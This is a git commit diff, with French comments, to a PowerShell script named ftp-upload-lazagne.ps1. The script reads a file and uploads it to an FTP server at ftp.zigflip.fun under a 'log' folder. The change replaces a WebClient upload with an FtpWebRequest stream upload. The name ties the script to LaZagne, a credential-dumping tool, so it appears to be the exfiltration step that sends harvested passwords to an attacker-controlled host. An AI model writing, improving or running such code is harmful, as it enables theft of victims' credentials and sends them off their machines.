a7a5c2548bd5132a96f2b9eb48865f0c954c76cc
LittleZiG <fgtbg@yahoo.fr>
2024-01-09 16:52:54 +0100

    Gros changement prendre version précédente

--- ftp-upload-lazagne.ps1
+++ ftp-upload-lazagne.ps1
@@ -9,13 +9,25 @@ function ftp-upload {
 
     try {
         $outputFile = Split-Path $fileupload -leaf
-    
-	$fileContent = Get-Content -Path $fileupload -Raw -Encoding UTF8
-	
-        $webClient = New-Object System.Net.WebClient
-        $webClient.Credentials = New-Object System.Net.NetworkCredential($ftpUsername, $ftpPassword)
-        
-        $webClient.UploadData("ftp://ftp.zigflip.fun/log/" + $outputFile, [System.Text.Encoding]::UTF8.GetBytes($fileContent))
+
+        # Spécifier l'encodage (utf-8) lors de la lecture du fichier
+        $fileContent = Get-Content -Path $fileupload -Raw -Encoding UTF8
+
+        $ftpRequest = [System.Net.FtpWebRequest]::Create("ftp://ftp.zigflip.fun/log/" + $outputFile)
+        $ftpRequest.Credentials = New-Object System.Net.NetworkCredential($ftpUsername, $ftpPassword)
+        $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
+
+        # Convertir le contenu du fichier en tableau d'octets avec l'encodage UTF-8
+        $fileBytes = [System.Text.Encoding]::UTF8.GetBytes($fileContent)
+        $ftpRequest.ContentLength = $fileBytes.Length
+
+        # Obtenir le flux de la requête et écrire les données
+        $requestStream = $ftpRequest.GetRequestStream()
+        $requestStream.Write($fileBytes, 0, $fileBytes.Length)
+        $requestStream.Close()
+
+        # Obtenir la réponse du serveur
+        $ftpResponse = $ftpRequest.GetResponse()
 
         Write-Host "Le fichier a été uploadé avec succès."
     }
